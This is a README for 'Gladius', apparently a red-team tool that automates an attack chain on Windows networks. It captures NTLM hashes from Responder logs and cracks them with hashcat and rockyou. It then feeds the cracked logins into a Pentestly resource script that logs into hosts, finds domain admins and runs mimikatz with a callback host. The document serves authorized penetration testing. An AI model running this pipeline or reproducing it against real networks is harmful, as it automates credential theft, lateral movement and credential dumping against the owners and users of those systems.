## Responder to Credentials

### Install
```
pip install watchdog
git clone https://git.praetorianlabs.com/thebarbershopper/gladius
```

### Configuration
First things first, have to set our configuration:
```
[Project]
project_path = testing2

[Responder]
hashcat = /root/tools/hashcat/hashcat-cli64.bin
wordlist = /root/tools/hashcat/rockyou.txt
ruleset = /root/tools/hob064.rule
watch_path = /opt/responder/logs

[Pentestly]
nmap = /tmp/gladius.xml

[Recon-ng]
path = /opt/recon-ng/recon-ng

[Mimikatz]
lhost = 10.10.11.156
```

### Start
After setting up configuration, simple start.
```
python2 start.py
```

```
[root@Praetorian-IPTD-4 auto-pentest]# python2 start.py --help
usage: start.py [-h] [-v]

optional arguments:
  -h, --help     show this help message and exit
  -v, --verbose  Increased output verbosity
```

### Start Responder and watch cracked credentials fly by..

### Output

![exmaple.png](example.png)

### Workings

#### Responder

Watches responder log for `*NTLM*txt` files. For each file found, parses output, creates a temp file containing the new hashes, and passes this to hashcat with the correct hash type

```
To watch for NTLM hashes from hashdump, simply create a file with NTLM hashes from hashdump and drop a file with `hashdump` in its name in the Responder `watch_path` directory.
Note: Will have to manually examine output in `./PROJECT/responderhander_out/*` to check for results from `hashdump` cracking.
```

#### Credentials

Watches for output from `hashcat` and exports files with the following format:

```
Domain Username Password
```

#### Pentestly

Watches for sanitized hashcat output and passes credentials to `pentestly` via the following resource script.

```
workspaces add gladius
load nmap
set filename /tmp/gladius.xml
run

load login
set domain DOMAIN
set username USERNAME
set password PASSWORD
run

load get_domain_admin_names
run

load mimikatz
set lhost LHOST
run

load reporting/csv
set filename OUTFILE
set table pentestly_creds
run
```

#### Admin

Watches for output from Pentestly and parses the found credentials for `Local Admin` and new credentials from `Mimikatz`

#### Run Tests

```
python -m unittest discover test
```

```
pip install coverage
coverage run -m unittest discover test
```

### Example module

```
class CredsHandler(GladiusHandler):

    patterns = ['*']

    def process(self, event):
        with open(event.src_path, 'r') as f:
            data = f.read().split('\n')

        # Perform work on data
```


Add yourself to the handlers list
```
handlers = [(ResponderHandler, config.get('Responder', 'watch_path')),
            (CredsHandler, ResponderHandler().outpath),
            (PentestlyHandler, CredsHandler().outpath)]
```
